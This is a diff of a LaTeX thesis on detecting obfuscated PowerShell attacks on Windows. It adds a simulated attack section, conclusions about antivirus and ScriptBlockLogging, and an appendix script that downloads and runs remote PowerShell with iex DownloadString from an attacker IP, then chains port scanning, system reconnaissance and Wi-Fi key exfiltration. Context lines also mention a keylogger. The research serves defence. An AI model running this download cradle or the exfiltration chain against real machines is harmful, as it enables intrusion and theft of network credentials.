@@ -508,9 +508,8 @@ Creating Scriptblock text (2 of 52)
 This means that a very large script, large as in the script contains a high number of symbols, is executed. As mentioned before the obfuscation techniques of Invoke-Obfuscation create large scripts when obfuscated. Most scripts when obfuscated end up beign larger then five hundred thousand symbols. So this event log, could perhaps indicate that an obuscated file was executed. 
 The windows versions,Windows $7$ and $8$ Home edition, which do not have scriptblock logging and module logging, did not show any sign of suspicous behavior. Which means that a new line of defence built around logging would be useless. It might be worth noting that scriptblock and module logging can be added to windows $7$ and $8$ if the OS is upgraded to pro edition. It is fair to assume that most people will not buy the upgrade, therefore leaving them vulnerable to some attacks. But if scriptblock and module logging are enabled and configured correctly, then they can act as another layer of defence. Some possible configurations will be presented in the next section.
 
-
-\subsection{What additional defence systems can be deployed against obfuscated powershell scripts}
-In this section, the sub question will be answered by atempting to answer a different question, that is: "In what ways can we bypass the standard defences of a Windows machine". This section will be therefore written from the perspective of the attacker in the beginning. The results of the attack process will then afterwards be discussed from a defenders point of view.
+\subsection{In what ways can we bypass the standard defences of a Windows machine}
+In this section, a sub-question will be answered that wil aid with answering the upcoming sub-question: "What additional defence systems can be deployed against obfuscated powershell scripts". In order to answer this question, in this section a real world attack will be simulated. Therefore this section will be written from the perspective of the attacker. The results of the attack process will then afterwards be discussed from a defenders point of view.
 
 \subsubsection{Test Environment}
 In this subsection a short description of the environment will be given for reproducibility. A more detailed description can be found in chapter $2$.
@@ -651,9 +650,18 @@ DESCRIPTION
 \end{verbatim}
 Although a system admin might not fall for this trick, many normal computer users will. This means that an attacker, when targeting a normal user, uses this scripts, then the chances of the attacker gaining root privilege is high.
 After the victim used their password, the following information was given to the attacker.
+\textit{Figure 3: Output Invoke-SSIDExfil}\\
 \includegraphics[scale=0.5]{result.png}
-\subsubsection{The end of the attack-phase}
-By using this SSID and Key the attacker can now advance towards gaining root priveleges on the victim machine. This is also where the attack scenario given will end. It is worth notin once again that all the information that was extracted from the victims machine, was extracted while AV was turned on. Proving once again that an AV is not enough to secure a windows machine.
+\subsubsection{conclusion}
+By using this SSID and Key the attacker can now advance towards gaining root priveleges on the victim machine. This is also where the attack scenario given will end. It is worth notin once again that all the information that was extracted from the victims machine, was extracted while AV was turned on. This is probably the case because scanning tools do not modify any vital parameter in a machine and therefore seem much more harmless then malware even though the potential of scanning scripts can be much more dangerous then a ransomeware script. Whit this, the subquestion of this section can be aswered. While AV does a good job protect a users machine against malware, it fails to defend a user from reconessaince scripts. Therefore hackers can make good use of the PowerShell built in commands to write sophisticated scanning scripts and gather valueable information that could aide the attacker in their next attack phases. A good example used here was \textbf{Get-Information}, which has given the attacker the name of the admin account allong with all the software currently installed on the computer. The logging tool however does document the attack correctly. It even stores values such as the attackers ip, which can be very usefull for the forensic analysis done after the attack.\newpage
+\textit{Figure 4: ScriptBlockLogging log for reverse shell script}\\
+\includegraphics[scale=0.45]{20.png}
+To gain a log file whith the least amount of noise possible, as in log entries that have nothing to do with the attack, a new script was created that executes step $1$ to step $10$. The script can be found as an attachment called \hyperlink{script3}{Invoke-SuperScript}. The log file was filtered with eventID $4104$. This presented the following result:
+\newpage
+\textit{Figure 5: ScriptBlockLogging log for Invoke-SuperScript.ps1 Unobfuscated}\\
+\includegraphics[scale=0.45]{21.png}
+The log file was able to mark the scripts with the warning level. This already seems more promising then the AV-programs. However as mentioned in seciton 3.2, the attacker can obfuscate their script inorder to overwrite important log entries and therefore cover their tracks. Although this attack was tested on a machine using the archiving property of Event Viewer, the default setting is to overwrite old event entries. Meaning that a obfuscated script would ingeneral overwrite the important log entries shown in figure $5$. In the next section, the thesis will discus some strategies to circumvent this issue.
+\subsection{What additional defence systems can be deployed against obfuscated powershell scripts}
 \newpage
 \section{Sources}
 \begin{enumerate}
@@ -1014,35 +1022,83 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode,
 }
 Start-KeyLogger
 \end{verbatim}
+\hypertarget{script3}{\subsubsection{Invoke-SuperScript.ps1}}
+\begin{verbatim}
+function Invoke-SuperScript{
+
+	iex (new-Object net.webclient).DownloadString
+	("http://192.168.2.36:8000/Invoke-PortScan.ps1");
+
+	iex (new-Object Net.WebClient).DownloadString
+	("http://192.168.2.36:8000/Check-VM.ps1");
+
+	iex (new-Object Net.WebClient).DownloadString
+	("http://192.168.2.36:8000/Get-Information.ps1");
+
+	iex (new-Object Net.WebClient).DownloadString
+	("http://192.168.2.36:8000/Invoke-SSIDExfil.ps1");
+
+	Invoke-PortScan -StartAddress 10.0.2.1 
+	    -EndAddress 10.0.2.254 -ResolveHost -ScanPort;
+
+	Invoke-PortScan -StartAddress 10.0.2.15 
+	    -EndAddress 10.0.2.15 -ResolveHost -ScanPort;
+
+	Check-VM;
+
+	Get-Information;
+
+	Invoke-SSIDExfil;
+}
+\end{verbatim}
 \hypertarget{output1}{\subsubsection{Output:Get-Information}}
 \begin{verbatim}
-get-childitem : Cannot find path 'HKEY_CURRENT_USER\software\simontatham\putty' because it does not exist.
+get-childitem : Cannot find path 'HKEY_CURRENT_USER\software\
+simontatham\putty' because it does not exist.
 At line:27 char:21
 +         else{$key = get-childitem $regkey}
 +                     ~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : ObjectNotFound: (HKEY_CURRENT_US...montatham\putty:String) [Get-ChildItem], ItemNotFoundException
-    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+    + CategoryInfo          : ObjectNotFound: 
+    (HKEY_CURRENT_US...montatham\putty:String) [Get-ChildItem],
+    ItemNotFoundException
+    + FullyQualifiedErrorId :
+    PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
  
-get-childitem : Cannot find path 'HKEY_CURRENT_USER\software\simontatham\putty\sessions' because it does not exist.
+get-childitem : Cannot find path
+'HKEY_CURRENT_USER\software\simontatham\putty\sessions' because it 
+does not exist.
 At line:27 char:21
 +         else{$key = get-childitem $regkey}
 +                     ~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : ObjectNotFound: (HKEY_CURRENT_US...\putty\sessions:String) [Get-ChildItem], ItemNotFoundException
-    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
+    + CategoryInfo          : ObjectNotFound:
+    (HKEY_CURRENT_US...\putty\sessions:String) [Get-ChildItem], 
+    ItemNotFoundException
+    + FullyQualifiedErrorId :
+    PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
  
-get-item : Cannot find path 'HKLM:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities' because it does not exist.
+get-item : Cannot find path
+'HKLM:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities' 
+because it does not exist.
 At line:26 char:37
 +         if ($child -eq "no"){$key = get-item $regkey}
 +                                     ~~~~~~~~~~~~~~~~
-    + CategoryInfo          : ObjectNotFound: (HKLM:\SYSTEM\Cu...alidcommunities:String) [Get-Item], ItemNotFoundException
-    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand
+    + CategoryInfo          : ObjectNotFound:
+    (HKLM:\SYSTEM\Cu...alidcommunities:String) [Get-Item], 
+    ItemNotFoundException
+    + FullyQualifiedErrorId :
+    PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand
  
-get-item : Cannot find path 'HKCU:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities' because it does not exist.
+get-item : Cannot find path
+'HKCU:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities' 
+because it does not exist.
 At line:26 char:37
 +         if ($child -eq "no"){$key = get-item $regkey}
 +                                     ~~~~~~~~~~~~~~~~
-    + CategoryInfo          : ObjectNotFound: (HKCU:\SYSTEM\Cu...alidcommunities:String) [Get-Item], ItemNotFoundException
-    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand
+    + CategoryInfo          : ObjectNotFound:
+    (HKCU:\SYSTEM\Cu...alidcommunities:String) [Get-Item], 
+    ItemNotFoundException
+    + FullyQualifiedErrorId :
+    PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand
  
 
 Logged in users:
@@ -1075,10 +1131,12 @@ Install
 C:\Windows\system32\cmd.exe
 C:\Windows\System32\Drivers\DriverData
 Windows_NT
-C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Window
+\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
 AMD64
-C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32
+\WindowsPowerShell\v1.0\Modules
 C:\Windows\TEMP
 C:\Windows\TEMP
 SYSTEM
@@ -1242,7 +1300,7 @@ The command completed successfully.
 
 User accounts for \\WIN-H8C7LGTI40B
 
--------------------------------------------------------------------------------
+---------------------------------------------------------
 Administrator            DefaultAccount           Guest                    
 NormalUser               WDAGUtilityAccount       
 The command completed successfully.
@@ -1252,7 +1310,7 @@ The command completed successfully.
 
 Aliases for \\WIN-H8C7LGTI40B
 
--------------------------------------------------------------------------------
+---------------------------------------------------------
 *Access Control Assistance Operators
 *Administrators
 *Backup Operators
